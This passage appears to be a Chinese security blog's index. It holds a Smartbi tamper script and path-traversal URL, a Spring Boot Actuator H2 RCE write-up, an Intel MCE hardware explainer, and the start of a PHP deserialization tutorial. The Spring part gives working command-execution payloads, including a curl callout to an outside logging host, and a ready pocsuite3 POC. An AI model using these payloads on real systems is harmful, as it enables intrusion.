&quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;, }DECODING_SCHEDULE = { &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;'&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;, &quot;/&quot;: &quot;%&quot;, &quot;n&quot;: &quot;'&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;, &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;, &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;, &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;, &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;, &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;, }#此函数可以用来加密明文也可以解密服务器返回的密文def encode(code): out = &quot;&quot; for item in code: out = out + ENCODING_SCHEDULE.get(item, item) return outdef decode(code): out = &quot;&quot; for item in code: out = out + DECODING_SCHEDULE.get(item, item) return outdef dependencies(): passdef tamper(payload, **kwargs): &quot;&quot;&quot; rmi-encodes all characters in a given payload &gt;&gt;&gt; tamper(&quot;1' AND SLEEP(5)#&quot;) 'MScgQU5EIFNMRUVQKDUpIw==' &quot;&quot;&quot; return encode(payload, binary=False) if payload else payload 任意文件读取V85以下的可能任意文件下载都有。V95版本不存在。 1https://127.0.0.1/vision/FileServlet?ftpType=out&amp;path=upload/../../../../../../../../../../etc/passwd&amp;name=%E4%B8%AD%E5%9B%BD%E7%9F%B3%E6%B2%B9%E5%90%89%E6%9E%97%E7%99%BD%E5%9F%8E%E9%94%80%E5%94%AE%E5%88%86%E5%85%AC%E5%8F%B8XX%E5%8A%A0%E6%B2%B9%E7%AB%99%E9%98%B2%E9%9B%B7%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88.docx [ 转载：http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/","link":"/2021/01/18/WEB/Exploit/Smartbi-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"title":"Spring Boot Actuator H2 RCE漏洞复现","text":"漏洞概述Spring Boot框架是最流行的基于Java的微服务框架之一，可帮助开发人员快速轻松地部署Java应用程序，加快开发过程。当Spring Boot Actuator配置不当可能造成多种RCE，因为Spring Boot 2.x默认使用HikariCP数据库连接池，所以可通过H2数据库实现RCE。 HikariCP数据库连接池 之前的两个RCE都是在Spring Boot 1.x版本下进行的，在spring 2.x下的版本如何进行RCE呢。幸运的是，Spring Boot 2.x默认使用的HikariCP数据库连接池提供了一个可以RCE的变量。这个变量就是spring.datasource.hikari.connection-test-query。这个变量与HikariCP中的connectionTestQuery配置相匹配。根据文档，此配置定义的是在从池中给出一个连接之前被执行的query，它的作用是验证数据库连接是否处于活动状态。简言之，无论何时一个恶心的数据库连接被建立时，spring.datasource.hikari.connection-test-query的值将会被作为一个SQL语句执行。然后利用SQL语句中的用户自定义函数，进行RCE。 H2 CREATE ALIAS 命令H2数据库引擎是一个流行的java开发数据库，非常容易与Spring Boot集成，仅仅需要如下的一个dependency。 12345&lt;dependency&gt; &lt;groupId&gt;com.h2database&lt;/groupId&gt; &lt;artifactId&gt;h2&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 在H2中有一个非常重要的命令，与PostgreSQL中的用户定义函数相似，可以用CREATE ALIAS创建一个java函数然后调用它，示例如下: 12CREATE ALIAS GET_SYSTEM_PROPERTY FOR &quot;java.lang.System.getProperty&quot;;CALL GET_SYSTEM_PROPERTY('java.class.path'); 仿照这个，创建命令执行的java函数可以如下: 123456String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) { return s.next(); } throw new IllegalArgumentException(); } 那么RCE所需的SQL语句即: 12CREATE ALIAS EXEC AS &quot;String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}&quot;;CALL EXEC('curl ntxo6i.dnslog.cn'); 与1.x类似，在端点/actuator/env通过POST方法进行环境变量的赋值。payload为 12345POST /actuator/env HTTP/1.1content-type: application/json{&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('curl ntxo6i.dnslog.cn');&quot;} 执行RCE的SQL语句已经构建好，接下来就是触发一个新的数据库连接，通过向端点/actuator/restart发送POST请求，即可重启应用出发新的数据库连接。请求如下 12345POST /actuator/restart HTTP/1.1content-type: application/json{} 命令执行的结果: POC编写1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from collections import OrderedDictimport timefrom pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPEfrom pocsuite3.api import OptStringclass DemoPOC(POCBase): vulID = '00000' # ssvid version = '1.0' author = ['ol4three'] vulDate = '2020-1-22' createDate = '2020-1-22' updateDate = '2020-1-22' references = [''] name = '' appPowerLink = 'https://spring.io/projects/spring-boot' appName = 'spring-boot' appVersion = '2.x' vulType = VUL_TYPE.XSS desc = '''springboot H2 Rce''' samples = [] category = POC_CATEGORY.EXPLOITS.WEBAPP def _options(self): o = OrderedDict() o[&quot;exec&quot;] = OptString('', description='Please input your exec', require=True) return o def _verify(self): result = {} url = self.url url1 = self.url + '/actuator/env' url2 = self.url + '/actuator/restart' payload = '''{&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('%s');&quot;}''' % (self.get_option(&quot;exec&quot;)) headers = {'content-type' : 'application/json'} r1 = requests.post(url1, data=payload, headers=headers) #time.sleep(2) r2 = requests.post(url2, data=payload, headers=headers) if r1.status_code == 200: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = self.url result['VerifyInfo']['Postdata'] = (self.get_option(&quot;exec&quot;)) return self.parse_output(result) def _attack(self): return self._verify() def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return outputregister_poc(DemoPOC) 修复建议升级到安全版本 参考链接https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database","link":"/2021/01/22/WEB/Exploit/springboot/Spring-Boot-Actuator-H2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"Intel MCA与MCE硬件机制概述","text":"简述Intel从奔腾4开始的CPU中增加了一种机制，称为MCA——Machine Check Architecture，它用来检测硬件（这里的Machine表示的就是硬件）错误，比如系统总线错误、ECC错误等等。 这套系统通过一定数量的MSR（Model Specific Register）来实现，这些MSR分为两个部分，一部分用来进行设置，另一部分用来描述发生的硬件错误。 当CPU检测到不可纠正的MCE（Machine Check Error）时，就会触发#MC（Machine Check Exception），通常软件会注册相关的函数来处理#MC，在这个函数中会通过读取MSR来收集MCE的错误信息，然后重启系统。当然由于发生的MCE可能是非常致命的，CPU直接重启了，没有办法完成MCE处理函数；甚至有可能在MCE处理函数中又触发了不可纠正的MCE，也会导致系统直接重启。 当然CPU还会检测到可纠正的MCE，当可纠正的MCE数量超过一定的阈值时，会触发CMCI（Corrected Machine Check Error Interrupt），此时软件可以捕捉到该中断并进行相应的处理。CMCI是在MCA之后才加入的，算是对MCA的一个增强，在此之前软件只能通过轮询可纠正MCE相关的MSR才能实现相关的操作。 Machine Check MSR前面已经说过，MCA是通过一系列的MSR来实现，这里介绍下这些MSR寄存器，首先看下面的图： 上图基本包含了MCA相关的所有MSR。 它分为左右两个部分，左边的是全局的寄存器，右边表示的是多组寄存器。 i表示的是各个组的Index。这里的组有一个称呼是Error Reporting Register Bank。 MCA通过若干Bank的MSR寄存器来表示各种类型的MCE。 下面简单介绍一下这些寄存器。 IA32_MCG_CAP MSR这个MSR描述了当前CPU处理MCA的能力，具体每个位的作用如下所示： BIT0-7：表示的是CPU支持的Bank的个数； BIT8：1表示IA32_MCG_CTL有效，如果是0的话表示无效，读取该IA32_MCG_CTL这个MSR可能发生Exception（至少在UEFI下是这样）； BIT9：1表示IA32_MCG_EXT_CTL有效，反之无效，这个与BIT8的作用类似； BIT10：1表示支持CMCI，但是CMCI是否能用还需要通过IA32_MCi_CTL2这个MSR的BIT30来使能； BIT11：1表示IA32_MCi_STATUS这个MSR的BIT56-55是保留的，BIT54-53是用来上报Threshold-based Error状态的； BIT16-23：表示存在的Extended Machine Check State寄存器的个数； BIT24：1表示CPU支持Software Error Recovery； BIT25：1表示CPU支持增强版的MCA； BIT26：1表示支持更多的错误记录（需要UEFI、ACPI的支持）； BIT27：1表示支持Local Machine Check Exception； IA32_MCG_STATUS MSR该MSR记录了MCE发生时CPU的状态，主要的BIT位介绍如下： 这里的IP指的是Instruction Pointer，指向当前的CPU指令； EIPV为1时表示当前的指令与导致MCE的原因相关；RIPV为1表示当前CPU从当前指令继续执行并不会有什么问题； 但是还是不知道这两个BIT有什么用处… IA32_MCG_CTL MSR这个寄存器的存在依赖于IA32_MCG_CAP这个MSR的BIT8。 这个寄存器主要用来Disable（写1）或者Enable（写全0）MCA功能。 IA32_MCG_EXT_CTL MSR这个寄存器同样依赖于IA32_MCA_CAP这个MSR，这次依赖的是BIT9。该MSR的BIT位说明如下图所示： 目前有就BIT0有用，用来Disable（写1）或者Enable（写0）LMCE，这个LMCE的功能就是使硬件能够将某些MCE发送给单个的逻辑处理器，为什么要这样做目前还不是很 清楚。 以上都是全局的MSR，下面介绍每个Bank对应的MSR， 这些寄存器的第一个是IA32_MC0_CTL，它的地址一般都是400H。之后接着的是IA32_MC0_STATUS，IA32_MC0_ADDR，IA32_MC0_MISC，但是在之后并不是IA32_MC0_CTL2，而是IA32_MC1_CTL；对于IA32_MCi_CTL2来说，它的地址跟上面的这些不在一起，第一个IA32_MC0_CTL2是在280H，之后是IA32_MC1_CTL2在281H，以此类推。 IA32_MCi_CTL MSRs每个Bank的CTL的作用是用来控制在发生哪些MCA的时候来触发#MC： 这里的64个BIT位，设置某个BIT位就会使对应BIT位的MCA类型在发生时触发#MC。 IA32_MCi_STATUS MSRS这类MSR的作用就是显示MCE信息： 注意只有当VAL这个BIT位（BIT63）为1时才表示发生了对应这个Bank的MCE。当MCE发生了，软件需要给这个VAL位写0来清零（如果有可能的话，因为对于不可纠正的MCE可能软件会 来不及写），不能往这位写1，会出现Exception。 BIT0-15，BIT16-31：这个两个部分都表示MCE的错误类型，前者是通用的，后者是跟CPU有关的； BIT58：1表示IA32_MCi_ADDR这个MSR是有效的，反之无效； BIT59：1表示IA32_MCi_MISC这个MSR是有效的，反之无效；这两个BIT是因为不同MCE错误并不是都需要ADDR和MSIC这样的MSR； BIT60：这个位于IA32_MCi_CTL中的位是对应的，那边使能了，这里就是1； BIT61：表示MCE是不可纠正的； BIT62：表示发生了二次的MCE，这个时候到底这个Bank表示的是哪一次的MCE信息，需要根据一定的规则来确定： 这个可以先不关注。 另外还有一些寄存器在这里不介绍，具体还是看手册。 IA32_MCi_ADDR MSRs这个MSR并没有特别好介绍的： 这个地址指向内存中导致MCE的代码或者数据。 注意这个地址在不同的内存模型下可以是偏移地址，虚拟地址和物理地址中的一种，这个需要MISC这个MSR来确定，下面胡讲到。 这个MSR也可以手动清零，写1会出错。 IA32_MCi_MISC MSRs这个寄存器的BIT位说明如下： 这里的Address Mode说明如下： IA32_MCi_CTL2 MSRs这个寄存器就是为CMCI使用的，BIT位说明如下： 一个是用于使能CMCI，另一个是用来设置CMCI的阈值。 除了上述的MSR之外，在IA32_MCG_CAP这个MSR的说明中还提到过它的BIT16-23还提到了额外的MSR，它们称为Extended Machine Check State，这些MSR的描述如下： 上图实际上只展示了非64位CPU的MSR，还有一个64位CPU的MSR，这里就不再多说。 需要注意，实际上上面的这些寄存器并不需要自己一个个去对比和解析，Intel提供了一个工具叫做MCE Decoder，可以用来解析MCE。 另外在Intel的开发者手册中有专门的一个章节解析MCE错误：《CHAPTER 16 INTERPRETING MACHINE-CHECK ERROR CODES》。 CMCI前面以及提到，CMCI是后期加入到MCA的一种机制，它将错误上报的阈值操作从原始的软件轮询变成了硬件中断触发。 一个CPU是否支持CMCI需要查看IA32_MCG_CAP的BIT10，如果该位是1就表示支持。 另外CMCI默认是关闭的，需要通过IA32_MCi_CTL2的BIT30来打开，并设置BIT0-14的阈值，注意每个Bank都要设置。 设置的时候首先写1到IA32_MCi_CTL2的BIT30，再读取这个值，如果值变成了1，说明CMCI使能了，否则就是CPU不支持CMCI；之后再写阈值到BIT0-14，如果读出来的值是0，表示不支持阈值，否则就是成功设置了阈值。 CMCI是通过Local ACPI来实现的，具体的示意图如下： 在Local ACPI Table中有专门处理CMCI的寄存器，称为LVT CMCI Register (FEE0 02F0H) ： BIT0-7：中断向量； BIT8-10：Delivery Mode，比如SMI，NMI等； BIT12：Delivery Status，0表示没有中断，1表示中断正在发生； BIT17：Interrupt Mask，0表示接收中断，1表示屏蔽中断； 关于CMCI的初始化和CMCI处理函数的实现，手册上有部分的介绍，不过没有什么源代码可以借鉴，这个不展开了。 MCA的初始化手册上有一个伪代码可供参考： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051IF CPU supports MCETHEN IF CPU supports MCA THEN IF (IA32_MCG_CAP.MCG_CTL_P = 1) (* IA32_MCG_CTL register is present *) THEN IA32_MCG_CTL ← FFFFFFFFFFFFFFFFH; (* enables all MCA features *) FI IF (IA32_MCG_CAP.MCG_LMCE_P = 1 and IA32_FEATURE_CONTROL.LOCK = 1 and IA32_FEATURE_CONTROL.LMCE_ON= 1) (* IA32_MCG_EXT_CTL register is present and platform has enabled LMCE to permit system software to use LMCE *) THEN IA32_MCG_EXT_CTL ← IA32_MCG_EXT_CTL | 01H; (* System software enables LMCE capability for hardware to signal MCE to a single logical processor*) FI (* Determine number of error-reporting banks supported *) COUNT← IA32_MCG_CAP.Count; MAX_BANK_NUMBER ← COUNT - 1; IF (Processor Family is 6H and Processor EXTMODEL:MODEL is less than 1AH) THEN (* Enable logging of all errors except for MC0_CTL register *) FOR error-reporting banks (1 through MAX_BANK_NUMBER) DO IA32_MCi_CTL ← 0FFFFFFFFFFFFFFFFH; OD ELSE (* Enable logging of all errors including MC0_CTL register *) FOR error-reporting banks (0 through MAX_BANK_NUMBER) DO IA32_MCi_CTL ← 0FFFFFFFFFFFFFFFFH; OD FI (* BIOS clears all errors only on power-on reset *) IF (BIOS detects Power-on reset) THEN FOR error-reporting banks (0 through MAX_BANK_NUMBER) DO IA32_MCi_STATUS ← 0; OD ELSE FOR error-reporting banks (0 through MAX_BANK_NUMBER) DO (Optional for BIOS and OS) Log valid errors (OS only) IA32_MCi_STATUS ← 0; OD FI FI Setup the Machine Check Exception (#MC) handler for vector 18 in IDT Set the MCE bit (bit 6) in CR4 register to enable Machine-Check ExceptionsFI MSR的读写x86平台读写MSR有专门的指令，分别是rdmsr和wrmsr。下面是MSR读写的一个基本实现： gcc版本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/** Returns a 64-bit Machine Specific Register(MSR). Reads and returns the 64-bit MSR specified by Index. No parameter checking is performed on Index, and some Index values may cause CPU exceptions. The caller must either guarantee that Index is valid, or the caller must set up exception handlers to catch the exceptions. This function is only available on IA-32 and X64. @param Index The 32-bit MSR index to read. @return The value of the MSR identified by Index.**/UINT64EFIAPIAsmReadMsr64 ( IN UINT32 Index ){ UINT32 LowData; UINT32 HighData; __asm__ __volatile__ ( &quot;rdmsr&quot; : &quot;=a&quot; (LowData), // %0 &quot;=d&quot; (HighData) // %1 : &quot;c&quot; (Index) // %2 ); return (((UINT64)HighData) &lt;&lt; 32) | LowData;} /** Writes a 64-bit value to a Machine Specific Register(MSR), and returns the value. Writes the 64-bit value specified by Value to the MSR specified by Index. The 64-bit value written to the MSR is returned. No parameter checking is performed on Index or Value, and some of these may cause CPU exceptions. The caller must either guarantee that Index and Value are valid, or the caller must establish proper exception handlers. This function is only available on IA-32 and X64. @param Index The 32-bit MSR index to write. @param Value The 64-bit value to write to the MSR. @return Value**/UINT64EFIAPIAsmWriteMsr64 ( IN UINT32 Index, IN UINT64 Value ){ UINT32 LowData; UINT32 HighData; LowData = (UINT32)(Value); HighData = (UINT32)(Value &gt;&gt; 32); __asm__ __volatile__ ( &quot;wrmsr&quot; : : &quot;c&quot; (Index), &quot;a&quot; (LowData), &quot;d&quot; (HighData) ); return Value;} 汇编版： 1234567891011121314151617181920212223242526272829;-------------------------------------------------------; UINT64; EFIAPI; AsmReadMsr64 (; IN UINT64 Index; );;-------------------------------------------------------AsmReadMsr64 PROC mov ecx, [esp + 4] rdmsr retAsmReadMsr64 ENDP ;-------------------------------------------------------; UINT64; EFIAPI; AsmWriteMsr64 (; IN UINT32 Index,; IN UINT64 Value; );;--------------------------------------------------------AsmWriteMsr64 PROC mov edx, [esp + 12] mov eax, [esp + 8] mov ecx, [esp + 4] wrmsr retAsmWriteMsr64 ENDP MCEMachine Check Exception (MCE) 是CPU发现硬件错误时触发的异常(exception)，中断号是18，异常的类型是abort： 导致MCE的原因导致mce的原因主要有：总线故障、内存ECC校验错、cache错误、TLB错误、内部时钟错误，等等。不仅硬件故障会引起MCE，不恰当的BIOS配置、firmware bug、软件bug也有可能引起MCE。 在 Linux 系统上，如果发生的MCE错误属于可以自动纠正的类型，那么系统保持继续运行，MCE错误日志会记录在一个ring buffer中（这个ring buffer通过设备文件/dev/mcelog来访问），用 mcelog(8) 命令可以读取MCE日志，系统通常会通过cron任务或者mcelog.service把ring buffer中的MCE日志写入/var/log/mcelog文件中。如果发生的MCE错误属于无法恢复的类型，那么系统会panic，错误信息会输出在终端上和message buffer里。 分析MCE分析MCE需要参考Intel手册第3卷，15章Machine-Check Architecture和16章Interpreting Machine-Check Error Codes。由于MCE在不同型号的CPU上有差异，解读的方法也有不同，第16章是专门解释在不同的CPU型号上如何解读MCE错误码。 每个CPU上有一组寄存器称为 Machine-Check MSR (Model-Specific Register)，用于Machine-Check的控制与记录，分为全局寄存器和若干Bank寄存器（CPU的硬件单元分成若干组，每一组称为一个Bank）。当发生MCE时，错误信息记录在全局状态寄存器 MCG_STATUS MSR 和Bank寄存器 MCi_STATUS MSR 中，如下图黄色框所示： 分析MCE的方法，就是根据Intel手册解读上述寄存器中记录的错误信息。Linux内核把MCE的信息保存在下面的结构体中： 1234567891011121314151617181920212223/arch/x86/include/asm/mce.h ： 0067 struct mce {0068 __u64 status; /* 对应 IA32_MCi_STATUS MSR */0069 __u64 misc;0070 __u64 addr;0071 __u64 mcgstatus;/*对应 IA32_MCG_STATUS MSR */0072 __u64 ip;0073 __u64 tsc; /* cpu time stamp counter */0074 __u64 time; /* wall time_t when error was detected */0075 __u8 cpuvendor; /* cpu vendor as encoded in system.h */0076 __u8 inject_flags; /* software inject flags */0077 __u16 pad;0078 __u32 cpuid; /* CPUID 1 EAX */0079 __u8 cs; /* code segment */0080 __u8 bank; /* machine check bank */0081 __u8 cpu; /* cpu number; obsolete; use extcpu now */0082 __u8 finished; /* entry is valid */0083 __u32 extcpu; /* linux cpu number that detected the error */0084 __u32 socketid; /* CPU socket ID */0085 __u32 apicid; /* CPU initial apic ID */0086 __u64 mcgcap; /* MCGCAP MSR: machine check capabilities of CPU */0087 }; 下面的MCE错误信息截取自一台因MCE而crash的机器，我们以此为例来解读一下MCE信息。注：产生以下信息的内核函数是：static void print_mce(struct mce *m)源程序：arch/x86/kernel/cpu/mcheck/mce.c如果需要的话，阅读源程序可以理解输出的信息与原始数据的对应关系。 12345[Hardware Error]: CPU 3: Machine Check Exception: 4 Bank 5: be00000000800400[Hardware Error]: TSC 128727f47a97 ADDR 3f628bd69349 MISC 1 [Hardware Error]: PROCESSOR 0:106a5 TIME 1450279905 SOCKET 1 APIC 14[Hardware Error]: Machine check: Processor context corruptKernel panic - not syncing: Fatal Machine check 其中CPU和Bank是MCE的接收者： CPU 3 – 表示检测到MCE错误的是3号CPU，对应struct mce的extcpu字段； Bank 5 – 一组硬件单元称为一个bank，每个bank对应一组machine-check寄存器； MCE的错误代码包括两部分： Machine Check Exception: 4 – 表示 IA32_MCG_STATUS MSR寄存器的状态码是4（含义见后文），对应 mcgstatus字段； be00000000800400 – 表示 IA32_MCi_STATUS MSR寄存器中的错误码（含义见后文），对应status字段。 Machine Check Excheption: 4 的含义它来自全局状态寄存器 IA32_MCG_STATUS MSR，(对应struct mce的 mcgstatus字段)，只用到三个bit，如下所示。4表示machine-check in progress。 Bit 0: Restart IP Valid. 表示程序的执行是否可以在被异常中断的指令处重新开始。 Bit 1: Error IP Valid. 表示被中断的指令是否与MCE错误直接相关。 Bit 2: Machine Check In Progress. 表示 machine check 正在进行中。 be00000000800400 的含义它来自bank寄存器IA32_MCi_STATUS MSR，(对应struct mce的status字段)。 be00000000800400 的二进制位如下： 12345678Bit 63: VAL. 表示本寄存器中包含有效的错误码Bit 61: UC. 表示是无法纠正的MCEBit 60: EN. 表示处于允许报告错误的状态Bit 59: MISCV. 表示MCi_MISC寄存器中含有对该错误的补充信息Bit 58: ADDRV. 表示MCi_ADDR寄存器含有发生错误的内存地址Bit 57: PCC. 表示该CPU的上下文状态已被该错误破坏，无法恢复软件代码的运行Bits [16:31] 包含特定CPU型号相关的扩展错误码. 本例中是0x0080.Bits [0:15] 包含MCE错误码，该错误码是所有CPU型号通用的，分为两类：simple error codes（简单错误码） 和 compound error codes（复合错误码） 本例中0x0400表示Internal timer error： 12345678910111213141516– Simple Error Codes:0000 0000 0000 0000 – 没有错误.0000 0000 0000 0001 – Unclassified. 未分类的错误类型.0000 0000 0000 0010 – ROM微码校验错0000 0000 0000 0011 – MCE是由于别的CPU的BINT# 引起的.0000 0000 0000 0100 – Functional redundancy check (FRC) master/slave error.0000 0000 0000 0101 – Internal parity error.0000 0100 0000 0000 – Internal timer error.0000 01xx xxxx xxxx – Internal unclassified error. 至少有一个x等于1– Compound Error Codes:000F 0000 0000 11LL – Generic cache hierarchy errors.000F 0000 0001 TTLL – TLB errors.000F 0000 1MMM CCCC – Memory controller errors (Intel-only).000F 0001 RRRR TTLL – Memory errors in the cache hierarchy.000F 1PPT RRRR IILL – Bus and interconnect errors. 下一步，由于Bits [16:31] 是非零值0x0080，包含的是特定CPU型号相关的扩展错误码，我们要参考Intel手册第三卷第16章。首先确定CPU型号，我们需要的是CPU faimily和model，从/proc/cpuinfo中可以找到： 12345678910111213141516# less /proc/cpuinfo...processor : 3vendor_id : GenuineIntelcpu family : 6model : 26model name : Intel(R) Xeon(R) CPU L5520 @ 2.27GHzstepping : 5cpu MHz : 2266.700cache size : 8192 KBphysical id : 1siblings : 8core id : 2cpu cores : 4apicid : 20... 根据cpu family/model，即06_1AH，找到Intel手册中对应的章节，但是没找到匹配Internal timer error和0x0080的条目。所以只能到此为止了。 所以MCE检测的错误为： CPU 3 发现了无法纠正的MCE，是Internal timer error，被中断的指令与MCE不相关，被中断的程序指令不能恢复运行，CPU的上下文已被MCE破坏 如何禁用MCE可以在 /boot/grub/grub.conf 中加入以下内容：mce=off 还有其它的MCE选项，比如禁用CMCI(Corrected Machine Check Interrupt)，或者禁用MCE日志，等等，例如：mce=off — Disable machine checkmce=no_cmci — Disable CMCI(Corrected Machine Check Interrupt) 参见文档：Documentation/x86/x86_64/boot-options.txt 每个 CPU 都有一个sysfs接口：/sys/devices/system/machinecheck/machinecheckN注：(N = CPU number) 其中包含的可调参数参见：Documentation/x86/x86_64/machinecheck 参考资料Intel 64 and IA-32 Architectures Software Developer’s Manual AMD64 Architecture Programmer’s Manual Volume 2: System Programming http://linuxperf.com/?p=105","link":"/2021/01/22/IOT/Intel-MCA%E4%B8%8EMCE%E7%A1%AC%E4%BB%B6%E6%9C%BA%E5%88%B6%E6%A6%82%E8%BF%B0/"},{"title":"PHP反序列化学习与实践","text":"概念 反序列化：PHP程序为了保存和转储对象，提供了序列化的方法，PHP序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。 基本上都是围绕这两个函数来展开的，通俗的说反序列化和序列化的意思。 序列化：将对象转换成字符串。 反序列化：将序列化后的字符串转换为对象还原。 这两个关系相当于一正一反。 PHP序列化 PHP序列化的函数为serialize。反序列化的函数为unserialize。 反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控 实例： 12345678910111213141516171819202122&lt;?php class test{ private $flag = &quot;111&quot;; protected $a1 = &quot;aaa&quot;; public $b2 = &quot;bbb&quot;; public function set_flag($flag) { $this-&gt;flag = $flag; } public function get_flag() { return $this-&gt;flag; }} $test = new test; $test-&gt;set_flag('ol4three'); $data = serialize($test); echo $data;?&gt; 反序列化可以控制类属性，无论是private还是public 123╰─$ php test.phpO:4:&quot;test&quot;:3:{s:10:&quot;testflag&quot;;s:8:&quot;ol4three&quot;;s:5:&quot;*a1&quot;;s:3:&quot;aaa&quot;;s:2:&quot;b2&quot;;s:3:&quot;bbb&quot;;}O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:{&lt;properties&gt;} 这里说明一下序列化字符串的含义：O:4:&quot;test&quot;指Object(对象) 4个字符:test:3对象属性个数为3{}中为属性字符数：属性值 注意：如果你是细心的同学，你可能会注意到一个小问题，按照我前面对象名的格式算的话你可能会发现后面的属性名有些另类，你看啊,我代码里面明明写的是flag 属性，序列化以后却变成了 testflag ，而且前面说好的长度也不一样了，testflag明明是8个字符，到你这里却成了10个，除此之外后面的 test 属性也“变异了”，前面多了个（）并且长度也不对，这到底是为什么呢？ 这涉及到PHP的属性的访问权限序列化为了能把整个类对象的各种信息完完整整的压缩，格式化，必然也会将属性的权限序列化进去，我们发现我们定义的类的属性有三种 private protected 和 默认的 public(默认属性)，其中 1.Public权限Public是几个字符就是几个字符 2.Private 权限该权限是私有权限，也就是说只能 test类使用，于是在序列化的时候必须加入一些标志，所以私有属性序列化为 1%00类名%00属性名 查看一下我们的序列化的结果 12345678╰─$ php test.php &gt; a.txt╰─$ xxd a.txt00000000: 4f3a 343a 2274 6573 7422 3a33 3a7b 733a O:4:&quot;test&quot;:3:{s:00000010: 3130 3a22 0074 6573 7400 666c 6167 223b 10:&quot;.test.flag&quot;;00000020: 733a 383a 226f 6c34 7468 7265 6522 3b73 s:8:&quot;ol4three&quot;;s00000030: 3a35 3a22 002a 0061 3122 3b73 3a33 3a22 :5:&quot;.*.a1&quot;;s:3:&quot;00000040: 6161 6122 3b73 3a32 3a22 6232 223b 733a aaa&quot;;s:2:&quot;b2&quot;;s:00000050: 333a 2262 6262 223b 7d 3:&quot;bbb&quot;;} 3.Protected根据上图的结果可以看到Protected的序列化结果为 1%00*%00属性名 编写反序列化代码： 12345678910111213141516171819202122&lt;?php class test{ private $flag = &quot;111&quot;; protected $a1 = &quot;aaa&quot;; public $b2 = &quot;bbb&quot;; public function set_flag($flag) { 